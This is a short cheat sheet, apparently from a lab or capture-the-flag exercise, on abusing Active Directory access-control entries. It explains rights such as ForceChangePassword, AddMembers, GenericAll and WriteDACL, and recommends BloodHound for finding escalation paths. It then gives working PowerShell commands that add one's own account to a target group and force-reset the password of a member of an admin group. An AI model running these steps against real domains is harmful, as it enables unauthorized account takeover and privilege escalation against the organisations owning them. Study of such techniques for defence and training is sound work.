# Exploiting ACE

## Noteable ACE
* **ForceChangePassword**: We have the ability to set the user's current password without knowing their current password.
* **AddMembers**: We have the ability to add users (including our own account), groups or computers to the target group.
* **GenericAll**: We have complete control over the object, including the ability to change the user's password, register an SPN or add an AD object to the target group.
* **GenericWrite**: We can update any non-protected parameters of our target object. This could allow us to, for example, update the scriptPath parameter, which would cause a script to execute the next time the user logs on.
* **WriteOwner**: We have the ability to update the owner of the target object. We could make ourselves the owner, allowing us to gain additional permissions over the object.
* **WriteDACL**: We have the ability to write new ACEs to the target object's DACL. We could, for example, write an ACE that grants our account full control over the target object.
* **AllExtendedRights**: We have the ability to perform any action associated with extended AD rights against the target object. This includes, for example, the ability to force change a user's password.

Use bloodhound to find privilege escalation to admin and see if there is any noteable ACE to exploit.

## AddMembers
To Exploit "IT Support" being the group to exploit:
```
Add-ADGroupMember "IT Support" -Members "Your.AD.Account.Username"
```
To Check:
```
Get-ADGroupMember -Identity "IT Support"
```

## ForceChangePassword
Check who is in admin group, "Tier 2 Admins" being the group:
```
Get-ADGroupMember -Identity "Tier 2 Admins"
```
Since the network is shared, it might be best to select one further down in the list. We will use the Set-ADAccountPassword AD-RSAT cmdlet to force change the password:
```
PS C:\>$Password = ConvertTo-SecureString "New.Password.For.User" -AsPlainText -Force 
PS C:\>Set-ADAccountPassword -Identity "AD.Account.Username.Of.Target" -Reset -NewPassword $Password 
```

